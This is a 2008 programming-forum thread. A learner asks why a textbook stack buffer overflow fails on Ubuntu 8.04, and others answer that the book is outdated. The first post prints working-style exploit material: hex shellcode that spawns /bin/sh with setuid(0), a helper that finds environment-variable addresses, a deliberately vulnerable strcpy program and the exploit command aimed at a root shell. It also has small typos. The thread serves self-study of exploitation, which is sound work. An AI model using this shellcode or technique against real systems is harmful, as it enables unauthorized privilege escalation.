---
title: "Please help!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
date: 2008-10-26
forum: Programming Talk
---

### Post by jovko654 on 2008-10-26
I bought a book about Stack-based overflows, bss-heap overflows.
And none of these tehniques work on ubuntu 8.04.

i turned off virtual memory adress, and i turned off stack protection
from compilers, but yet it wont work.

i did this:

$ perl -e 'print 
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";' > shellcode


-----------------------------------------------------------------------------

//getenvaddr.c code
#include <stdlib.h>

int main(int argc, char *argv[])
{
    char*addr;
    if(argc < 2)
    {
       printf("Usage:\n%s <enviroment variable name>\n", argv[0]);
       exit(0);
    }

    addr = getenv(argv[1]);
    if(addr == NULL)
        printf("The enviroment variable %s doesn't exist.\n", argv[1]);
    else
        printf("%s is located at %p\n", argv[1], addr);
    
    return 0
}

--------------------------------------------------------------------------

then i did this:


$ gcc-3.3 getenvaddr.c -o getenvaddr

$ export SHELLCODE='cat shellcode'

$ ./getenvaddr SHELLCODE
SHELLCODE is located at 0xbffff778

--------------------------------------------------------------------------

//vuln2.code
int main(int argc, char *argv[])
{
     char buffer[5];
     strcpy(buffer, argv[1]);
     return 0;
}
--------------------------------------------------------------------------

Because the name of the vulnerable program is vuln2, which is 5 bytes long, and the name of the helper program is getenvaddr, which is 10 bytes long, the address of the shellcode will be ten bytes more when the vulnerable program is executed. This is because the helper programs name is 5 bytes more than the vulnearable program's name, so address will be
0xbfffff782
--------------------------------------------------------------------------

./vuln2 `perl -e 'print "\x82\xf7\xff\xbf"x10;'`
Segmetation Fault


?????
and i should become root
Can someone tell me why this isnt working on ubuntu 8.04?

---

### Post by Sef on 2008-10-26
Moved to programming talk.

---

### Post by jovko654 on 2008-10-26
anybody ?

---

### Post by loell on 2008-10-26
stack and heap overflow shellcodes aren't that good running in ubuntu. :D

---

### Post by jovko654 on 2008-10-26
there is no way this will work on ubuntu 8.04 ??

---

### Post by loell on 2008-10-26
its hard to say, may i ask when was the book published?

---

### Post by jovko654 on 2008-10-26
2003.

Do you know what are the reason for this not working?
Why is non of this stuff working?

I dont understand , i say it to read from that memory addres, and it wont,
maybe shellcode not good?
i have been trying now 6 hours without break , to do something from book,
and nothing is working, i have gone crazy, downloading ubuntu 6.02 to see
will this work on it.

what do you think ????

---

### Post by CyberCowboy on 2008-10-26
First, I'm not a programmer, I can do Hello World code and that's about it, however it would seem to me that any Stack Overflow that results in escalation would be considered a security risk and a bug.  I would venture a guess that since the book was published in 2003 anything in it would be fixed by now.

That said have you tried installing a version that was new about the time the book came out?  (you could install it in a virtualbox install so you can keep your existing setup.)

---

### Post by loell on 2008-10-26
yeah, this  overflows are moving targets.  it doesn't work partly because of kernel fixes? perl fixes? or it could be gcc fixes?

the book may only be useful now as reference, other than that, if you wanna have some hands on,  I guess you'll gonna have to try those recently published Proof of Concept at secunia or securiteam.

---

### Post by jovko654 on 2008-10-26
they say it should work if you turn off virtual adress, and compiler have stack protection but i turned everything off, so it must be something else.
shellcode something

---

### Post by drubin on 2008-10-26
Please read my sig about how to ask questions.

Also using "Re: Please help!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" Is not helpful for any one to know what your problems are. I would recommend changing it if possible.

Also using that many explanations is not going to help people answer your question any faster.

---

